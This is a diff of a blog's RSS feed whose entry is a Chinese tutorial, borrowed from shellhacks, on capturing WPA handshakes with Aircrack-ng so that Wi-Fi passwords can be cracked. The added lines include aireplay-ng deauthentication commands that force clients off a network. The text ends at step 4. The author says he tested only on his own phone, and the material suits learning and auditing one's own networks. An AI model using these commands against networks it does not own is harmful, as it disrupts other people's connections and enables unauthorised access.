@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>wifi on wrfly&#39;s blog</title>
@@ -58,15 +58,21 @@ https://github.com/porjo/mt7601
 PS：非法破解他人密码是违法行为，本人一切行为均在自己手机中进行。请大家测试的时候遵守法律法规。
 此文分享自shellhacks
 0.安装 Aircrack-ng
-$ sudo apt-get install build-essential libssl-dev libnl-3-dev pkg-config libnl-genl-3-dev 下载最新版的 Aircrack-ng：
- $ wget http://download.aircrack-ng.org/aircrack-ng-1.2-rc1.tar.gz -O - | tar -xz $ cd aircrack-ng-1.2-rc1 $ sudo make $ sudo make install  1.打开网卡的监听模式
+下载最新版的 Aircrack-ng：
+1.打开网卡的监听模式
 首先结束可能会导致问题的进程：
-$ sudo airmon-ng check kill 然后开启网卡监听模式：
-$ sudo airmon-ng start wlan0 看一下现在的网卡在mon0上是打开的监听模式的。
+$ sudo airmon-ng check kill  然后开启网卡监听模式：
+$ sudo airmon-ng start wlan0  看一下现在的网卡在mon0上是打开的监听模式的。
  打开Airodump-ng来收集认证信息
 $ sudo airodump-ng mon0
   然后选择特定的MAC地址进行测试：
-$ sudo airodump-ng -c 1 --bssid 00:11:22:33:44:55 -w WPAcrack mon0 --ignore-negative-one 上面这条命令的运行结果是这样的：</description>
+$ sudo airodump-ng -c 1 --bssid 00:11:22:33:44:55 -w WPAcrack mon0 --ignore-negative-one  上面这条命令的运行结果是这样的：
+以下是参数的说明：
+下图是出现握手成功的信息，注意图片右上角：
+如果出现这个信息，就说明已经成功捕捉到握手信息了：
+如果你等了很久，还是没有出现握手成功的信息，那么你可以试试第三步～
+3.（可选）用Aireplay-ng去断开已经认证了的客户端，强制其进行重新认证以获得握手信息：
+$ sudo aireplay-ng --deauth 100 -a 00:11:22:33:44:55 mon0 --ignore-negative-one  $ sudo aireplay-ng --deauth 100 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF mon0 --ignore-negative-one  4.</description>
     </item>
     
   </channel>
